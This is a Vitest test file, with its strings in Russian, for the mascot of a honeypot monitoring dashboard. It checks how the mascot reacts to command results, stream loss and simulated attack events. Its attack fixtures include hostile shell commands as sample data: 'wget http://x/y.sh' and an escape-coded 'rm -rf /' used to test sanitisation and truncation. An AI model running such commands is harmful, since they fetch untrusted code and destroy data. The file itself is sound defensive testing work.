// @vitest-environment happy-dom
import { describe, expect, it } from 'vitest';
import { MascotBridge } from '../../mascot/bridge/MascotBridge';
import type { MascotCore } from '../../mascot/core/MascotCore';
import { YUMI_RULES } from './rules';

/** Ядро-заглушка: записывает состояния и реплики. */
function setup() {
  const log = { states: [] as string[], said: [] as string[] };
  const core = {
    setState: (s: string) => log.states.push(s),
    say: (t: string) => log.said.push(t),
    playGesture: () => {},
    getRenderer: () => null,
  } as unknown as MascotCore;
  return { bridge: new MascotBridge(core, YUMI_RULES, { fallback: null }), log };
}

describe('реакции Юми (раздел 9)', () => {
  it('команды: отправка, успех, ошибка, истечение, неизвестный результат', () => {
    const { bridge, log } = setup();
    bridge.handle('command:sent', { command: 'start' });
    bridge.handle('command:done', { command: 'stop' });
    bridge.handle('command:failed', { command: 'start', reason: 'не удалось запустить' });
    bridge.handle('command:expired', { command: 'reset' });
    bridge.handle('command:unknown', { command: 'start' });
    bridge.handle('command:rejected', { command: 'stop', reason: 'У ловушки уже выполняется команда' });
    expect(log.states).toEqual(['thinking', 'success', 'error', 'gentle', 'curious', 'gentle']);
    expect(log.said).toEqual([
      'Отправила команду «Запустить». Жду агента.',
      'Команда «Остановить» выполнена.',
      'Команда «Запустить» не выполнена: не удалось запустить.',
      'Агент не выполнил «Сбросить ловушку» вовремя — проверь хост.',
      'Не знаю, дошла ли команда. Повтор безопасен.',
      'Центр не принял команду «Остановить»: У ловушки уже выполняется команда.',
    ]);
  });

  it('причина: убирается только конечная пунктуация, буквы не трогаются', () => {
    const { bridge, log } = setup();
    bridge.handle('command:failed', { command: 'start', reason: 'no such file: hosts' });
    bridge.handle('command:rejected', { command: 'stop', reason: 'Ловушку уже изменили — данные обновлены. ' });
    expect(log.said).toEqual([
      'Команда «Запустить» не выполнена: no such file: hosts.',
      'Центр не принял команду «Остановить»: Ловушку уже изменили — данные обновлены.',
    ]);
  });

  it('связь с потоком: потеря и восстановление', () => {
    const { bridge, log } = setup();
    bridge.handle('stream:lost');
    bridge.handle('stream:restored');
    expect(log.states).toEqual(['error', 'welcome']);
  });

  it('атаки: подключение, неудачный и удачный вход, команда, медовый токен', () => {
    const { bridge, log } = setup();
    bridge.handle('attack:connect', { ip: '192.0.2.23', protocol: 'ssh' });
    bridge.handle('attack:auth', { ip: '192.0.2.23', username: 'root', success: false });
    bridge.handle('attack:auth', { ip: '192.0.2.23', username: 'root', success: true });
    bridge.handle('attack:command', { ip: '192.0.2.23', command: 'wget http://x/y.sh' });
    bridge.handle('token:triggered', { ip: '203.0.113.9' });
    expect(log.states).toEqual(['curious', 'analyzing', 'excited', 'analyzing', 'error']);
    expect(log.said).toEqual([
      'Новое подключение с 192.0.2.23 по ssh.',
      '192.0.2.23 пробует войти как root.',
      '192.0.2.23 вошёл как root!',
      '192.0.2.23 выполняет: wget http://x/y.sh',
      'Сработал медовый токен! Источник 203.0.113.9.',
    ]);
  });

  it('данные атакующего — без управляющих символов, длинная команда обрезана (S1, S2)', () => {
    const { bridge, log } = setup();
    bridge.handle('attack:command', { ip: '192.0.2.23', command: `\u001b[31mrm -rf /\u001b[0m ${'a'.repeat(200)}` });
    const said = log.said[0]!;
    expect(said.includes('\u001b')).toBe(false);
    expect(said.startsWith('192.0.2.23 выполняет: rm -rf / ')).toBe(true);
    expect(said.endsWith('…')).toBe(true);
    expect(said.length).toBeLessThan(120);
  });

  it('мусор в payload не роняет реакцию; неизвестное событие игнорируется', () => {
    const { bridge, log } = setup();
    bridge.handle('attack:auth', { ip: null, username: { x: 1 }, success: 'да' });
    bridge.handle('something:new', { a: 1 });
    expect(log.said).toHaveLength(1);
    expect(log.said[0]).toMatch(/неизвестного адреса/);
  });
});
